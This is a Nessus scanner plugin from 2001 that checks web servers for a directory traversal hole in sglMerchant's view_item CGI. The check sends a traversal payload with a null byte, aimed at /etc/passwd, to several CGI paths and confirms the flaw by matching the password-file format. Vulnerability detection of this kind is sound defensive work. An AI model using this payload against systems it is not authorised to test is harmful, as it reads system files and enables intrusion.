#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10770);
script_cve_id("CAN-2001-1019");
 script_bugtraq_id(3309);
 script_version ("$Revision: 1.14 $");

 name["english"] = "sglMerchant Information Disclosure Vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "
A CGI (view_item) that is a part of sglMerchant is installed.

This CGI suffers from a security vulnerability that makes it possible to escape
the bounding HTML root directory and read arbitrary system files.

Solution: Contact the author of the program
Risk factor : High

Additional information:
http://www.securiteam.com/unixfocus/5KP012K5FK.html";

 script_description(english:desc["english"]);

 summary["english"] = "sglMerchant Information Disclosure Vulnerability";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

function check(url)
{
 url = string(url, "/view_item?HTML_FILE=../../../../../../../../../../etc/passwd%00");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);
 if (egrep(pattern:".*root:.*:0:[01]:.*", string:buf))
 {
  security_hole(port:port);
  exit(0);
 }
}

port = get_kb_item("Services/www");
if (!port) port = 80;

if(get_port_state(port))
{
 check(url:"/cgi_local");
 check(url:"/cgi-local");
 check(url:"/cgi-shop");
 foreach dir (cgi_dirs())
 {
 check(url:dir);
 }
}
